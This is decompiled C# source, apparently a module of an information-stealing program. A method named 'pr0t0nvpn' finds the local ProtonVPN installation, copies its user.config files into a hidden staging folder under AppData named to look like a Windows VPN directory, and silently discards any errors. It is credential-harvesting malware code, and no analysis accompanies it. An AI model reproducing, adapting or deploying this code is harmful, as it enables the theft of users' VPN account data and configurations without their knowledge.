using System;
using System.IO;

namespace prtvpn
{
	// Token: 0x02000007 RID: 7
	internal class protonvpn
	{
		// Token: 0x0600000B RID: 11 RVA: 0x00002754 File Offset: 0x00000954
		public static void pr0t0nvpn()
		{
			try
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				bool flag = Directory.Exists(folderPath + "\\ProtonVPN");
				if (flag)
				{
					string[] directories = Directory.GetDirectories(folderPath + "\\ProtonVPN");
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows\\VPN\\ProtonVPN");
					foreach (string text in directories)
					{
						bool flag2 = text.StartsWith(folderPath + "\\ProtonVPN\\ProtonVPN.exe");
						if (flag2)
						{
							string name = new DirectoryInfo(text).Name;
							string[] directories2 = Directory.GetDirectories(text);
							Directory.CreateDirectory(string.Concat(new string[]
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
								"\\Windows\\VPN\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name
							}));
							File.Copy(directories2[0] + "\\user.config", string.Concat(new string[]
							{
								Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
								"\\Windows\\VPN\\ProtonVPN\\",
								name,
								"\\",
								new DirectoryInfo(directories2[0]).Name,
								"\\user.config"
							}));
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
